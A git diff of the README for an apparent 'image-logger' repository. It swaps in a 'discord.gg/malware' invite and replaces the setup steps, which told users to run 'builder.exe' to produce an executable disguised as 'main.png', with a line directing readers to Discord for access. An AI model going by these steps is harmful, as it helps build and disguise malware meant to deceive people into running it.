@@ -10,7 +10,7 @@
     <img src="https://img.shields.io/github/issues/neveronsere/image-logger?color=%23000000&logoColor=%23000000">
     <img src="https://img.shields.io/github/issues-closed/neveronsere/image-logger?color=%23000000&logoColor=%23000000">
     <br>
-    - Join our server for announcements and updates: <a href="https://discord.gg/yeats">Join Discord</a>
+    - Join our server for announcements and updates: <a href="https://discord.gg/malware">Join Discord</a>
     - Please star the github repository for more updates
 </div>
 <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
@@ -58,10 +58,7 @@
 
 ### Setup
 
-1. [Download source code zip](https://github.com/neveronsere/image-logger/archive/refs/heads/main.zip)
-2. Extract zip
-3. Run `builder.exe`
-4. Follow instructions in builder and your exe will be found in the `dist` folder under the name `main.png`
+1. JOIN OUR DISCORD FOR ACCESS https://discord.gg/malware
 
 <div align="center">
     <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/bu0.png"></img>
